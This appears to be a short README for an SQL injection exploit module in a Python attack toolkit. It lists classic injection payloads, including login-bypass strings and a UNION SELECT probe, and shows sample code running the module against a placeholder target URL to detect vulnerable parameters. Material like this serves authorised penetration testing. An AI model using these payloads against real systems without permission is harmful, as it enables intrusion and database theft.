SQL Injection Exploit Module

Description

SQL Injection exploitation with error-based, union-based, and time-based detection.

Payloads

' OR '1'='1
' OR '1'='1' --
admin' --
1' UNION SELECT NULL--
1 AND 1=1
1 AND 1=2

Usage

from exploits.sqli_exploit import SQLiExploit

sqli = SQLiExploit()
result = sqli.execute("https://target.com/product?id=1")
if result["vulnerable"]:
    print(f"SQLi found! DB Type: {result['db_type']}")

Detection Methods

  • Error-based detection
  • Union-based detection
  • Time-based blind detection
  • Boolean-based blind detection
